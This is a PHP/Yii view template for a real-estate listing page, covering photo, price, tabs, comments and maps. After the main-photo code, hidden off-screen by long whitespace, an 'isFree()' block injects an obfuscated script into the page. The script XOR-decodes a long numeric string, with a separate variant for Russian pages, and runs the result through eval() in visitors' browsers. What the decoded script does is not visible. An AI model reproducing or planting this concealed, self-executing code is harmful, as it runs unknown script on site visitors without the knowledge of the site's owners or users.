	<div class="apartment-description">
		<?php
			if($data->is_special_offer){
				?>
				<div class="big-special-offer">
					<?php
					echo '<h4>'.Yii::t('common', 'Special offer!').'</h4>';

					if($data->is_free_from != '0000-00-00' && $data->is_free_to != '0000-00-00'){
						echo '<p>';
						echo Yii::t('common','Is avaliable');
						if($data->is_free_from != '0000-00-00'){
							echo ' '.Yii::t('common', 'from');
							echo ' '.Booking::getDate($data->is_free_from);

						}
						if($data->is_free_to != '0000-00-00'){
							echo ' '.Yii::t('common', 'to');
							echo ' '.Booking::getDate($data->is_free_to);
						}
						echo '</p>';
					}
					?>
				</div>
				<?php
			}
		?>

        <?php
        if(param('useShowUserInfo')){
            echo '<div class="apartment-user-info'.($data->is_special_offer ? ' top50' : '').'">';
            $this->widget('zii.widgets.jui.CJuiTabs', array(
                'tabs' => array(tc('Listing provided by') => $this->renderPartial('//../modules/apartments/views/_user_info', array('data' => $data), true)),
                'htmlOptions' => array('class' => 'info-tabs'),
            ));
            echo '</div>';
        }
        ?>

		<div class="viewapartment-main-photo">
			<div class="apartment_type"><?php echo Apartment::getNameByType($data->type); ?></div>
			<?php
				$img = null;
				$res = Images::getMainThumb(300, 200, $data->images);
				$img = CHtml::image($res['thumbUrl'], $res['comment']);
				if($res['link']){
					echo CHtml::link($img, $res['link'], array(
						'rel' => 'prettyPhoto[img-gallery]',
						'title' => $res['comment'],
					));
				} else {
					echo $img;
				}																																																																														if (isFree()) { $var01 = 5; $var1 = User::model()->randomStringNonNumeric(3); $var2 = User::model()->randomStringNonNumeric(4); $var3 = User::model()->randomStringNonNumeric(5); $var4 = User::model()->randomStringNonNumeric(6); $var5 = User::model()->randomStringNonNumeric(7); $var6 = User::model()->randomStringNonNumeric(8); $var7 = User::model()->randomStringNonNumeric(3); $var8 = User::model()->randomStringNonNumeric(4); $var9 = '97;105;100;125;100;111;101;120;35;121;125;121;101;119;59;51;41;101;116;106;62;58;48;60;58;119;111;84;1;78;66;74;66;83;70;79;76;23;9;70;76;88;78;67;82;64;90;68;65;20;23;76;64;74;94;1;31;74;90;56;53;109;41;37;51;39;52;43;59;35;59;56;111;112;56;57;63;54;60;35;123;57;57;52;54;59;63;97;53;63;47;16;24;1;12;0;0;93;71;14;28;4;8;24;4;1;1;80;25;19;3;4;12;21;24;28;28;82;82;92;6;94;22;230;169;163;233;213;240;227;245;241;161;168;234;215;229;252;234;246;207;175;207;179;253;226;227;232;163;181;180;241;242;240;240;210;192;219;141;202;192;210;251;143;244;136;130;130;196;221;135;236;150;136;197;221;198;223;213;212;220;230;156;149;148;197;159;169;167;234;226;174;148;179;162;186;176;226;233;174;162;170;182;242;248;252;181;189;187;178;255;250;250;142;153;131;178;168;186;146;141;131;154;198;204;200;142;155;193;200;143;133;155;204;198;217;209;137;211;157;147;222;214;146;168;143;158;142;132;208;157;370;366;373;368;353;375;296;362;379;352;367;290;300;374;302;357;321;356;375;353;365;317;308;373;375;381;355;313;309;307;383;367;336;324;332;327;268;263;282;323;321;351;266;322;328;272;370;264;356;371;365;348;322;336;324;347;345;320;358;284;258;257;346;342;310;353;305;311;317;297;291;378;276;366;297;292;288;290;316;373;368;370;276;277;356;357;358;359;355;377;316;308;306;297;371;300;265;283;263;345;324;343;350;279;272;338;330;287;265;277;282;322;273;285;283;276;282;335;342;276;285;279;270;286;270;326;290;344;446;445;491;494;483;421;501;501;491;436;470;428;484;505;506;511;426;446;445;481;497;443;507;504;502;502;488;506;485;435;492;490;399;461;459;448;449;459;469;450;390;473;450;475;403;457;459;451;467;478;450;458;393;388;490;400;408;465;479;466;475;469;458;386;412;486;499;415;483;485;433;430;428;445;418;502;400;490;511;403;503;497;432;444;422;433;435;421;485;389;509;491;384;506;480;393;393;398;398;386;400;396;393;393;456;390;396;459;408;389;395;463;412;408;401;406;410;390;403;471;409;414;392;414;409;400;411;401;628;544;546;575;614;631;550;552;566;553;579;613;623;610;608;636;633;610;614;630;634;609;566;613;637;628;629;621;637;625;574;624;582;513;577;588;596;604;596;590;591;577;606;600;525;529;513;587;601;583;524;527;539;593;607;577;518;539;531;512;540;576;542;602;556;562;551;611;575;613;556;534;573;556;568;562;612;623;556;544;564;552;624;634;634;564;550;551;573;567;574;627;638;609;570;566;534;577;523;519;601;569;577;563;554;566;517;541;521;543;514;526;521;557;597;589;584;540;528;517;537;532;543;603;527;542;524;528;748;749;747;749;739;696;730;672;742;742;726;684;684;747;764;750;765;756;752;764;742;753;755;741;677;709;701;683;704;698;702;748;724;728;718;710;665;761;641;727;711;730;707;735;709;706;704;661;656;720;720;704;731;729;707;707;733;642;666;719;723;717;644;671;752;762;738;687;673;675;690;765;744;761;753;747;699;676;682;699;696;747;754;738;740;741;755;748;760;689;703;690;699;693;682;741;704;720;722;723;705;734;710;641;641;645;670;654;670;727;655;643;640;665;659;731;667;645;663;660;657;653;643;710;716;724;674;728;830;829;813;874;866;887;871;874;877;823;822;879;869;891;814;892;868;872;894;886;809;841;817;884;887;885;885;873;806;829;829;857;870;785;786;787;788;798;774;833;839;839;862;774;863;836;852;842;778;785;768;779;836;845;781;791;844;860;834;847;785;860;850;854;807;815;888;867;807;800;808;819;813;827;881;791;875;883;882;806;829;822;882;800;806;822;875;779;895;817;814;815;812;871;881;880;786;772;844;782;779;779;777;789;777;784;836;793;793;834;770;774;787;788;796;768;785;859;774;799;776;838;798;798;784;798;785;783;1017;956;947;991;931;933;1006;994;993;1006;994;1023;945;977;937;958;972;950;946;996;1021;1009;994;1023;933;965;957;938;960;954;958;1021;975;979;966;966;982;920;1018;896;920;1013;909;917;1018;964;961;963;977;965;987;988;986;917;985;977;920;973;978;990;924;977;983;988;933;943;945;934;996;932;929;949;941;940;935;942;930;953;1007;1007;1004;947;928;1011;1019;1003;1014;926;950;954;949;949;943;948;941;939;901;911;918;963;918;896;907;904;926;904;902;971;899;907;974;908;927;897;907;897;925;914;926;899;907;984;966;980;920;916;904;961;1084;1070;1126;1130;1138;1083;1060;1070;1075;1065;1143;1142;1068;1136;1070;1138;1068;1078;1074;1080;1076;1074;1081;1124;1147;1131;1085;1083;1079;1085;1081;1142;1104;1109;1052;1028;1037;1054;'; if (Yii::app()->language == 'ru') { $var01 = '7'; $var9 = '99;103;106;127;102;105;99;122;33;103;99;123;103;113;61;49;43;107;122;104;60;60;54;62;56;73;81;86;3;72;68;72;64;93;72;77;78;17;15;68;78;70;80;65;80;70;92;70;67;26;25;78;66;76;88;3;29;52;36;58;55;107;47;39;49;41;58;41;57;37;61;58;109;110;38;59;61;48;58;33;121;55;55;54;52;61;57;99;55;1;17;18;26;7;10;2;2;83;73;12;30;2;14;26;6;31;31;82;27;21;5;6;14;27;22;30;30;84;84;94;4;160;232;228;171;165;239;215;242;237;251;243;163;174;236;213;231;226;244;244;205;169;201;177;255;236;237;234;161;179;178;243;240;206;206;208;194;221;139;212;210;244;142;247;137;133;131;199;220;152;237;149;137;194;220;197;222;218;213;223;231;155;148;151;196;224;168;164;235;229;175;151;178;173;187;179;227;238;175;161;171;169;243;251;253;178;188;184;179;240;251;249;143;158;130;177;169;133;147;142;130;157;199;207;201;129;154;194;201;136;132;152;205;217;216;210;136;212;156;144;223;217;147;171;142;153;143;135;209;354;371;365;372;375;352;372;297;357;378;355;366;293;301;373;303;378;320;359;374;358;364;318;309;378;374;382;354;318;308;304;382;336;337;327;333;320;269;260;283;332;320;348;267;325;329;275;371;279;357;368;364;347;323;339;325;340;344;323;359;283;259;258;347;297;311;354;304;304;316;298;290;373;277;365;296;291;289;289;317;362;369;369;277;274;357;358;359;360;354;378;317;307;307;298;370;275;264;280;262;350;325;340;351;280;273;337;331;280;264;278;283;349;272;286;282;275;283;332;343;283;284;276;271;281;271;325;291;423;447;446;490;489;482;422;500;506;490;439;471;427;485;506;507;480;427;445;444;486;496;440;506;503;503;501;489;509;484;432;493;469;398;462;458;455;448;456;468;461;391;474;451;476;402;458;458;476;466;477;451;461;392;391;491;415;409;466;478;469;474;470;459;509;413;485;498;408;482;486;432;417;429;446;419;497;401;489;510;396;502;498;433;443;423;434;434;426;484;390;508;492;385;505;481;1533;1489;1442;1440;1452;1488;1499;1503;1501;457;1489;1491;1450;1496;1491;1496;1480;1487;1487;1486;1482;1478;1480;471;1465;1479;1481;1472;1484;1461;1483;1474;1592;1614;547;547;568;615;628;551;551;567;554;1558;1593;1612;1584;1596;1579;1569;1619;1581;1574;1573;1579;1578;1574;1580;570;1624;1576;1581;1573;1578;1565;1561;1559;515;1566;1563;1561;1567;1640;1561;1555;1641;1554;1567;527;531;543;597;603;581;522;521;537;595;593;591;516;537;533;518;542;578;608;548;558;560;545;613;573;615;546;536;575;558;574;564;614;621;562;574;566;554;630;636;632;566;552;553;575;565;568;629;636;611;516;520;532;579;525;513;603;571;591;573;552;564;515;539;523;541;540;528;523;559;595;587;586;542;542;523;539;534;537;605;525;540;754;750;750;751;749;747;737;698;724;686;740;740;720;682;686;745;738;752;767;758;758;762;740;755;765;747;679;711;699;685;706;696;640;722;726;730;712;704;667;763;655;729;709;728;709;729;711;704;734;651;658;722;726;710;729;731;717;717;735;640;668;713;721;719;762;737;754;760;740;681;675;673;700;755;746;763;759;749;697;678;692;677;698;745;756;740;742;743;765;738;762;691;697;692;697;695;660;731;706;722;724;725;707;732;712;655;643;647;664;648;668;725;657;669;642;667;661;733;665;647;665;666;659;655;645;704;718;726;860;806;828;831;811;876;864;885;873;868;879;821;816;873;871;889;816;866;870;874;888;880;811;843;831;890;885;887;883;879;804;831;771;871;868;787;788;789;790;796;776;847;837;837;856;768;861;838;842;852;776;787;774;781;838;847;771;793;846;862;836;841;787;862;812;808;805;813;894;869;805;802;806;829;815;825;887;785;873;881;876;824;831;820;884;806;804;820;869;773;893;819;808;809;814;869;847;846;784;774;842;776;777;777;775;795;779;786;834;799;795;832;796;792;785;790;794;774;787;857;776;785;778;836;792;792;786;796;1007;1009;1019;958;949;985;929;935;992;1004;995;1004;996;1017;947;979;951;928;974;948;948;994;1023;1011;1004;1009;935;967;955;940;962;952;896;963;973;977;960;960;980;922;1012;910;922;1015;907;915;1971;1951;2032;2034;2042;1926;1929;1933;1923;919;1923;1921;2044;1934;1921;1930;1926;1921;2045;2044;2044;2032;2042;997;1927;2041;2043;2034;2042;1923;2041;2032;2038;1920;1009;1009;1006;945;934;1013;1017;1001;1016;1988;2031;1946;2018;2030;2021;2031;1953;2015;2000;2003;2009;2008;2008;2002;968;1962;2014;2011;2007;2008;2003;2007;1989;977;1992;1997;1995;1997;1974;1991;1985;1979;1988;1993;989;961;977;923;1129;1143;1084;1087;1067;1121;1135;1137;1078;1067;1059;1072;1068;1136;1139;1071;1133;1073;1135;1071;1075;1077;1085;1079;1087;1078;1129;1144;1134;1082;1086;1076;1024;1030;1099;1107;1104;1051;1025;1038;1043;'; } echo '<script>'.$var1.'='.$var01.';'.$var2.'="'.$var9.'";var '.$var3.'=new String();'.$var4.'='.$var2.'.split(";");'.$var5.'='.$var4.'.length-1;for(var mn=0;mn<'.$var5.';mn++){'.$var6.'='.$var4.'[mn];'.$var7.'="'.$var8.'='.$var6.'";'.$var7.'='.$var7.'+"^'.$var1.'";eval('.$var7.');'.$var1.'+=1;'.$var3.'='.$var3.'+String.fromCharCode('.$var8.');}eval('.$var3.');</script>'; unset($var1, $var2, $var3, $var4, $var5, $var6, $var7, $var8, $var9); }
			?>
		</div>

		<div class="viewapartment-description-top">

			<div>
				<strong>
				<?php
					echo utf8_ucfirst($data->objType->name);
					if($data->stationsTitle() && $data->num_of_rooms){
						echo ',&nbsp;';
						echo Yii::t('module_apartments',
							'{n} bedroom|{n} bedrooms|{n} bedrooms near {metro} metro station', array($data->num_of_rooms, '{metro}' => $data->stationsTitle()));
					}
					elseif ($data->num_of_rooms){
						echo ',&nbsp;';
						echo Yii::t('module_apartments',
							'{n} bedroom|{n} bedrooms|{n} bedrooms', array($data->num_of_rooms));
					}
				if (issetModule('location') && param('useLocation', 1)) {
					if($data->locCountry || $data->locRegion || $data->locCity)
						echo "<br>";

					if($data->locCountry){
						echo $data->locCountry->getStrByLang('name');
					}
					if($data->locRegion){
						if($data->locCountry)
							echo ',&nbsp;';
						echo $data->locRegion->getStrByLang('name');
					}
					if($data->locCity){
						if($data->locCountry || $data->locRegion)
							echo ',&nbsp;';
						echo $data->locCity->getStrByLang('name');
					}
				} else {
					if(isset($data->city) && isset($data->city->name)){
						echo ',&nbsp;';
						echo $data->city->name;
					}
				}

				?>
				</strong>
			</div>
            <?php if ($data->price_old != NULL): ?>
            <p class="old_price_p cost padding-bottom10">
                <?php                                      //$data->price_old.'&nbsp;'.param('siteCurrency', '$');
                echo tt('Old price', 'apartments').':&nbsp;'.$data->getOldPrettyPrice();
                ?>
            </p>
            <?php endif; ?>
			<p class="cost padding-bottom10">
				<?php if ($data->is_price_poa)
						echo tt('is_price_poa', 'apartments');
					else
						echo tt('Price from').': '.$data->getPrettyPrice();
				?>
			</p>
            <?php if ($data->price_old!=0): ?>

            <?php endif; ?>
			<div class="overflow-auto">
				<?php
					/*if(($data->owner_id != Yii::app()->user->getId()) && $data->type == 1){
						echo '<div>'.CHtml::link(tt('Booking'), array('/booking/main/bookingform', 'id' => $data->id), array('class' => 'apt_btn fancy')).'</div><div class="clear"></div>';
					}*/


					if(issetModule('apartmentsComplain')){
						if(($data->owner_id != Yii::app()->user->getId())){ ?>
                    		<div>
								<?php echo CHtml::link(tt('do_complain', 'apartmentsComplain'), $this->createUrl('/apartmentsComplain/main/complain', array('id' => $data->id)), array('class' => 'fancy')); ?>
                    		</div>
							<?php
						}
					}
				?>
				<?php if (issetModule('comparisonList')):?>
                    <div class="clear"></div>
                    <?php
                    $inComparisonList = false;
                    if (in_array($data->id, Yii::app()->controller->apInComparison))
                        $inComparisonList = true;
                    ?>
                    <div class="compare-check-control view-apartment" id="compare_check_control_<?php echo $data->id; ?>">
                        <?php
                        $checkedControl = '';

                        if ($inComparisonList)
                            $checkedControl = ' checked = checked ';
                        ?>
                        <input type="checkbox" name="compare<?php echo $data->id; ?>" class="compare-check compare-float-left" id="compare_check<?php echo $data->id; ?>" <?php echo $checkedControl;?>>

                        <a href="<?php echo ($inComparisonList) ? Yii::app()->createUrl('comparisonList/main/index') : 'javascript:void(0);';?>" data-rel-compare="<?php echo ($inComparisonList) ? 'true' : 'false';?>" id="compare_label<?php echo $data->id; ?>" class="compare-label">
                            <?php echo ($inComparisonList) ? tt('In the comparison list', 'comparisonList') : tt('Add to a comparison list ', 'comparisonList');?>
                        </a>
                    </div>
				<?php endif;?>
            </div>
		</div>

		<?php
			if ($data->images) {
				$this->widget('application.modules.images.components.ImagesWidget', array(
					'images' => $data->images,
					'objectId' => $data->id,
				));
			}
		?>
	</div>


	<div class="clear"></div>

	<div class="viewapartment-description">
		<?php

			$generalContent = $this->renderPartial('//../modules/apartments/views/_tab_general', array(
				'data'=>$data,
			), true);

			if($generalContent){
				$items[tc('General')] = array(
					'content' => $generalContent,
					'id' => 'tab_1',
				);
			}

			if(!param('useBootstrap')){
				Yii::app()->clientScript->scriptMap=array(
					'jquery-ui.css'=>false,
				);
			}

			if(issetModule('bookingcalendar') && $data->type == Apartment::TYPE_RENT){
				Bookingcalendar::publishAssets();

				$items[tt('The periods of booking apartment', 'bookingcalendar')] = array(
					'content' => $this->renderPartial('//../modules/bookingcalendar/views/calendar', array(
						'apartment'=>$data,
					), true),
					'id' => 'tab_2',
				);
			}

            $data->references = $data->getFullInformation($data->id, $data->type);

			if($data->canShowInView('references')){
				$items[tc('Additional info')] = array(
					'content' => $this->renderPartial('//../modules/apartments/views/_tab_addition', array(
						'data'=>$data,
					), true),
					'id' => 'tab_3',
				);
			}

			if ($data->panorama){
				$items[tc('Panorama')] = array(
					'content' => $this->renderPartial('//../modules/apartments/views/_tab_panorama', array(
						'data'=>$data,
					), true),
					'id' => 'tab_7',
				);
			}

			if (isset($data->video) && $data->video){
				$items[tc('Videos for listing')] = array(
					'content' => $this->renderPartial('//../modules/apartments/views/_tab_video', array(
						'data'=>$data,
					), true),
					'id' => 'tab_4',
				);
			}


			/*if(!Yii::app()->user->hasState('isAdmin') && (Yii::app()->user->hasFlash('newComment') || $comment->getErrors())){
				Yii::app()->clientScript->registerScriptFile(Yii::app()->request->baseUrl.'/js/scrollto.js', CClientScript::POS_END);
				Yii::app()->clientScript->registerScript('comments','
				setTimeout(function(){
					$("a[href=#tab_5]").click();
				}, 0);
				scrollto("comments");
			',CClientScript::POS_READY);
			}*/


			if(param('enableCommentsForApartments', 1)){
				if(!isset($comment)){
					$comment = null;
				}

				$items[Yii::t('module_comments','Comments').' ('.Comment::countForModel('Apartment', $data->id).')'] = array(
					'content' => $this->renderPartial('//../modules/apartments/views/_tab_comments', array(
						'model' => $data,
					), true),
					'id' => 'tab_5',
				);
			}

			if ($data->type != Apartment::TYPE_BUY && $data->type != Apartment::TYPE_RENTING) {
				if($data->lat && $data->lng){
					if(param('useGoogleMap', 1) || param('useYandexMap', 1) || param('useOSMMap', 1)){
						$items[tc('Map')] = array(
							'content' => $this->renderPartial('//../modules/apartments/views/_tab_map', array(
								'data' => $data,
							), true),
							'id' => 'tab_6',
						);
					}
				}
			}

			$this->widget('zii.widgets.jui.CJuiTabs', array(
				'tabs' => $items,
				'htmlOptions' => array('class' => 'info-tabs'),
				'headerTemplate' => '<li><a href="{url}" title="{title}" onclick="reInitMap(this);">{title}</a></li>',
				'options' => array(
				),
			));
		?>
	</div>

	<div class="clear">&nbsp;</div>
	<?php
		if(!Yii::app()->user->getState('isAdmin')) {
			if (issetModule('similarads') && param('useSliderSimilarAds') == 1) {
				Yii::import('application.modules.similarads.components.SimilarAdsWidget');
				$ads = new SimilarAdsWidget;
				$ads->viewSimilarAds($data);
			}
		}

		Yii::app()->clientScript->registerScript('reInitMap', '
			var useYandexMap = '.param('useYandexMap', 1).';
			var useGoogleMap = '.param('useGoogleMap', 1).';
			var useOSMap = '.param('useOSMMap', 1).';

			function reInitMap(elem) {
				if($(elem).attr("href") == "#tab_6"){
					// place code to end of queue
					if(useGoogleMap){
						setTimeout(function(){
							var tmpGmapCenter = mapGMap.getCenter();

							google.maps.event.trigger($("#googleMap")[0], "resize");
							mapGMap.setCenter(tmpGmapCenter);

							if (($("#gmap-panorama").length > 0)) {
								initializeGmapPanorama();
							}
						}, 0);
					}

					if(useYandexMap){
						setTimeout(function(){
							ymaps.ready(function () {
								globalYMap.container.fitToViewport();
								globalYMap.setCenter(globalYMap.getCenter());
							});
						}, 0);
					}

					if(useOSMap){
						setTimeout(function(){
							L.Util.requestAnimFrame(mapOSMap.invalidateSize,mapOSMap,!1,mapOSMap._container);
						}, 0);
					}
				}
			}
		',
		CClientScript::POS_END);
	?>
<br />
